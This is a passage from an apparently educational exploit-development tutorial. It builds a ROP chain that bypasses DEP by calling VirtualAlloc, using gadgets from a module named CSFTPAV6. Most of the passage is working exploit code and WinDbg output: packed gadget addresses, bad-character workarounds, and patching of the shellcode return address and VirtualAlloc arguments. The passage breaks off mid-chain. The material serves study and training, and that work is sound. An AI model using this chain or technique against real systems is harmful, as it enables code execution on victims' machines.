+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0245e2</span>f0  <span style="color:#ae81ff">45454545</span> <span style="color:#ae81ff">46464646</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">48484848</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0245e300</span>  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">0245e30</span>c <span style="color:#ae81ff">5050118</span>e
+</span></span></code></pre></div><p>With the correct value in EAX, we need to move that value back to ESI so we can use it in the next stages. We can do this with a gadget containing “PUSH EAX” and “POP ESI” instructions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5050118e</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax,esi ; pop esi ; retn  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x42424242</span>)) <span style="color:#960050;background-color:#1e0010">#</span> junk  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0xffffffe4</span>)) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1C</span>  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50537d5b</span>)) <span style="color:#960050;background-color:#1e0010">#</span> push eax ; pop esi ; ret
+</span></span></code></pre></div><p>This way we can use EAX while ESI contains the calculated address.
+The next step is to get the VirtualAlloc address of the IAT and load it into a register.</p>
+<h2 id="2-fetching-the-location-of-the-virtualalloc-address-in-the-iat-via-rop">2. Fetching the location of the VirtualAlloc address in the IAT via ROP</h2>
+<p>We previously found that the IAT address for VirtualAlloc is 0x5054A220, <strong>but we must remember that 0x20 is a bad character for our exploit.</strong>
+To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value.
+First, we will use a POP EAX instruction to fetch the modified IAT address into EAX.
+Then, we will pop -0x01 into ECX through a POP ECX instruction.
+Lastly, we will add the value of ECX into EAX, which will be like substracting 0x01 into EAX to obtain our desired value.
+<strong>Note how we are going to reused the previous gadgets as they are still useful:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051680a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop eax ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0xFFFFFFFF</span>)) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x01</span>  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5054A221</span>)) <span style="color:#960050;background-color:#1e0010">#</span> VirtualAlloc address in IAT of module  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret
+</span></span></code></pre></div><p>This way, <code>eax</code> will contain the IAT address where <code>VirtualAlloc</code> is located. But we want to access such memory address to get the real location of the function. We manage to do this by referencing the register:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051f278</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax, dword [eax] ; ret
+</span></span></code></pre></div><p>This way, the value inside <code>eax</code> (IAT pointer) is obtained and stored in <code>eax</code>. Now, <code>eax</code> contains the real address of VirtualAlloc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a220 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">064f</span>b018 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a221 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0102e2</span>f0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">278</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0102e33</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac po cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000213</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe3da</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">278</span> <span style="color:#ae81ff">8</span>b00            mov     eax,dword ptr [eax]  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5054</span>a220<span style="color:#f92672">=</span>{KERNEL32<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualAllocStub</span> (<span style="color:#ae81ff">76605680</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">76605680</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">064f</span>b018 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a221 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0102e2</span>f0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">27</span>a esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0102e33</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac po cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000213</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe3dc</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">27</span>a c3              ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> u eax
+</span></span><span style="display:flex;"><span>KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605680</span> <span style="color:#ae81ff">8</span>bff            mov     edi,edi
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605682</span> <span style="color:#ae81ff">55</span>              push    ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605683</span> <span style="color:#ae81ff">8</span>bec            mov     ebp,esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605685</span> <span style="color:#ae81ff">5</span>d              pop     ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76605686</span> ff2540b86676    jmp     dword ptr [KERNEL32<span style="color:#f92672">!</span><span style="color:#a6e22e">_imp__VirtualAlloc</span> (<span style="color:#ae81ff">7666</span>b840)]
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7660568</span>c cc              <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7660568</span>d cc              <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7660568</span>e cc              <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><p>We successfully jumped to the <code>VirtualAlloc</code> function! <code>eax</code> contains a pointer to this value.</p>
+<h2 id="3-patching-virtualalloc-address-with-the-obtained-one">3. Patching VirtualAlloc address with the obtained one</h2>
+<p>The last step is to replace the value we have in the location pointed by <code>esi</code>, which is the address in the stack that holds the dummy value of VirtualAlloc, for this obtained value.
+If we think a bit, a <code>mov [esi], eax</code> gadget will be enough:</p>
+<pre tabindex="0"><code>0x50524ea4: mov dword [esi], eax ; ret  ;  (1 found)
+</code></pre><p>Let&rsquo;s add this gadget in our ROP chain and see the final value of the address pointed by <code>esi</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">76605680</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span>db7a8 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a221 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>be2f0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50524</span>ea4 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>be340 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac po cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000213</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14006</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50524</span>ea4 <span style="color:#ae81ff">8906</span>            mov     dword ptr [esi],eax  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00f</span>be2f0<span style="color:#f92672">=</span><span style="color:#ae81ff">45454545</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">76605680</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span>db7a8 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">5054</span>a221 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>be2f0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50524</span>ea6 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>be340 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac po cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000213</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14008</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50524</span>ea6 c3              ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> dds esi L1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2f0  <span style="color:#ae81ff">76605680</span> KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub
+</span></span></code></pre></div><p>If we inspect the stack (a bit down as we have inserted a lot of gadgets) we can see that the address pointed by <code>esi</code> is the dummy value, that has been replaced with the correct value of <code>VirtualAlloc</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">&gt;</span> dds esp <span style="color:#f92672">-</span> <span style="color:#ae81ff">54</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2ec  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2f0  <span style="color:#ae81ff">76605680</span> KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub <span style="color:#75715e">// [esi] pointed here, we managed to overwrite this value
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">00f</span>be2f4  <span style="color:#ae81ff">46464646</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2f8  <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be2fc  <span style="color:#ae81ff">48484848</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be300  <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be304  <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be308  <span style="color:#ae81ff">00f</span>be30c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be30c  <span style="color:#ae81ff">5050118</span>e CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x118e</span> <span style="color:#75715e">// These are our ROP gadgets and values
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">00f</span>be310  <span style="color:#ae81ff">42424242</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be314  <span style="color:#ae81ff">505115</span>a3 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x705</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be318  ffffffe4
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be31c  <span style="color:#ae81ff">5051579</span>a CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48fc</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be320  <span style="color:#ae81ff">00f</span>be2f0
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be324  <span style="color:#ae81ff">5053</span>a0f5 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x29257</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be328  ffffffff
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be32c  <span style="color:#ae81ff">505115</span>a3 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x705</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be330  <span style="color:#ae81ff">5054</span>a221 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x39383</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be334  <span style="color:#ae81ff">5051579</span>a CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48fc</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be338  <span style="color:#ae81ff">5051f</span><span style="color:#ae81ff">278</span> CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe3da</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00f</span>be33c  <span style="color:#ae81ff">50524</span>ea4 CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14006</span>
+</span></span></code></pre></div><h1 id="patching-the-return-address-our-shellcode-using-rop">Patching the return address (our shellcode) using ROP</h1>
+<p>Remember that we inserted a dummy address prior to the call to VirtualAlloc? This is the dummy address that will be in the top of the stack when VirtualAlloc executes the <code>ret</code> instruction. As we haven&rsquo;t performed a call instruction as we are jumping via gadgets, we have to push the dummy address manually.
+Now, we pushed a dummy address, that we need to patch with the dynamic address of where our shellcode is located. We will do basically the same as we did with VirtualAlloc: First, we must align ESI with the placeholder value for the return address on the stack. Then we need to dynamically locate the address of the shellcode and use it to patch the placeholder value.</p>
+<p><strong>Note: We can avoid starting from 0 as when the last ROP chain was executed, ESI was storing the address of VirtualAlloc, which is 4 bytes lower than the return address.</strong> Remember what information do your register contain in order to reuse it. An instruction like <code>add esi, 0x04</code> would be great but it&rsquo;s not available in this module.
+In our case, we can find an INC ESI instruction. It&rsquo;s not clean, but there are several gadgets that can do not have bad side effects, like the following:</p>
+<pre tabindex="0"><code>rop += pack(&#34;&lt;L&#34;, (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+</code></pre><p>Note that the INC instruction increments the register by one byte, so we have to add the instruction four times in order to increment esi by four bytes. The side effect will only modify EAX, which we do not have to worry about at this point:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Step 2. Modify the shellcode address, return address, for our dynamically obtained shellcode address.  </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Substract 4 bytes from ESI so it points to our dummy shellcode address in stack (0x46464646)  </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#75715e"># inc esi ; add al, 0x2B ; ret  </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#75715e"># inc esi ; add al, 0x2B ; ret  </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#75715e"># inc esi ; add al, 0x2B ; ret  </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#75715e"># inc esi ; add al, 0x2B ; ret</span>
+</span></span></code></pre></div><p>Once the four gadgets are executed, if we take a look at esi, it points to our controlled shellcode dummy value in the stack:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">006</span><span style="color:#f92672">&gt;</span> dd esi L1 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d4fe304 <span style="color:#ae81ff">46464646</span>
+</span></span></code></pre></div><p>With ESI aligned correctly, we need to get the shellcode address in EAX so that we can reuse the “<code>MOV DWORD [ESI], EAX ; RET</code>” gadget to patch the placeholder value. The issue we face now is that we do not know the exact address of the shellcode since it will be placed after our ROP chain, which we haven’t finished creating yet. Note that we don&rsquo;t know where our shellcode will be as we will place it <strong>after the ROP chain, and not before it, as we have been doing in the previous buffer overflow techniques.</strong></p>
+<p>The approach to patch the value after we have placed all the ROP gadgets is using the value in ESI and adding a fixed value to it. Once we finish building the ROP chain, we can update the fixed value to correctly align with the beginning of the shellcode.</p>
+<p>First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing value in ESI in a register like EAX as a backup, since we need it there to patch the placeholder value.
+The idea is to:</p>
+<ul>
+<li>have in ESI the address of the pointer to our shellcode</li>
+<li>have in EAX the address of our shellcode
+So then we can fix <code>[ESI] with EAX</code> properly. Now we will use a dummy EAX value, like <code>ESI</code> minus a certain fixed offset, just to have the gadgets properly stored in the stack. We will replace the offset value afterwards.
+An instruction like “MOV EAX, ESI” is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into ESI. We can however solve this by restoring the value in ESI with the previously-used “PUSH EAX ; POP ESI ; RET” gadget. This way we can do the following:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5050118e</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax, esi ; pop esi ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x42424242</span>)) <span style="color:#960050;background-color:#1e0010">#</span> junk  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5052f773</span>)) <span style="color:#960050;background-color:#1e0010">#</span> push eax ; pop esi ; ret
+</span></span></code></pre></div><p>We basically have now the same value in ESI and EAX.
+Now, we add the offset to EAX. Remember that it is a dummy offset. <strong>Note: Do not use badchars for the offsets, even if they are dummy. For example, instead 0x200, use 0x210.</strong></p>
+<pre tabindex="0"><code>rop += pack(&#34;&lt;L&#34;, (0x505115a3)) # pop ecx ; ret  
+rop += pack(&#34;&lt;L&#34;, (0xfffffdf0)) # -0x210  
+rop += pack(&#34;&lt;L&#34;, (0x50533bf4)) # sub eax, ecx ; ret
+</code></pre><p>Here we have substracted EAX 210 bytes (dummy quantity). Once we know the exact offset from ESI to the shellcode, we can update the 0xfffffdf0 value to the correct one. At this point, EAX contains a placeholder address for our shellcode, which we can update once we finish building the entire ROP chain.</p>
+<p><strong>Note: See how we have reused several gadgets for this section! Not only gadgets, but also the value of the registers that are already stored due to prior gadget chains.</strong></p>
+<h1 id="patching-arguments-to-virtualalloc">Patching arguments to VirtualAlloc</h1>
+<p>We have successfully created and executed a partial ROP chain that locates the address of VirtualAlloc from the IAT and the shellcode address, and then updates the API call skeleton on the stack.</p>
+<p>In this section, we must patch all four arguments required by VirtualAlloc to disable DEP.
+Let&rsquo;s recap the function prototype of VirtualAlloc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">VirtualAlloc</span>(
+</span></span><span style="display:flex;"><span>[in, optional] LPVOID lpAddress,
+</span></span><span style="display:flex;"><span>[in] SIZE_T dwSize,
+</span></span><span style="display:flex;"><span>[in] DWORD flAllocationType,
+</span></span><span style="display:flex;"><span>[in] DWORD flProtect );
+</span></span></code></pre></div><p>Normally, we want the following:</p>
+<ul>
+<li>lpAddress should be the same value as the return address (the value of our shellcode)</li>
+<li>dwSize to be 0x01</li>
+<li>flAllocationType 0x1000</li>
+<li>flProtect 0x40</li>
+</ul>
+<h2 id="patching-lpaddress">Patching lpAddress</h2>
+<p>Regarding lpAddress, we first need to know where this address is in the stack. If we take a look, we can see that it is 4 bytes lower than the ESI register (which contain the return address) so we can increment ESI by four in order to have control over lpAddress. Let&rsquo;s use the same increment instructions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
